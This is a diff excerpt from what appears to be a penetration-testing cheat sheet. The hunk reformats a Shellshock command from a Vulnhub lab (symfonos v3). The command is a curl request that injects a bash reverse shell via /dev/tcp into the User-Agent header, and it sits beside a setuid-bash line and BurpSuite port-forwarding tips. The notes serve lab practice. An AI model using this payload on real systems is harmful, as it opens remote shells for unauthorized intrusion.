@@ -114,7 +114,7 @@ chmod +s /bin/bash
   
 #### cgi-bin folder or ShellShock
 > e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
-> ``` curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.100/9999 0>&1' http://192.168.10.10/cgi-bin underworld/test.sh ```
+> ```bash curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.100/9999 0>&1' http://192.168.10.10/cgi-bin underworld/test.sh```
 
 #### Portforwarding via BurpSuite
 > 1.  Under "Proxy Listeners" add new listener on random port [e.g TCP9000] and select option "All Interfaces". In "Request Handling" tab give the IP and Port [e.g IP2:80] of server you want to access. Now if you open http://IP1:9000 it will redirect to http://IP2:80
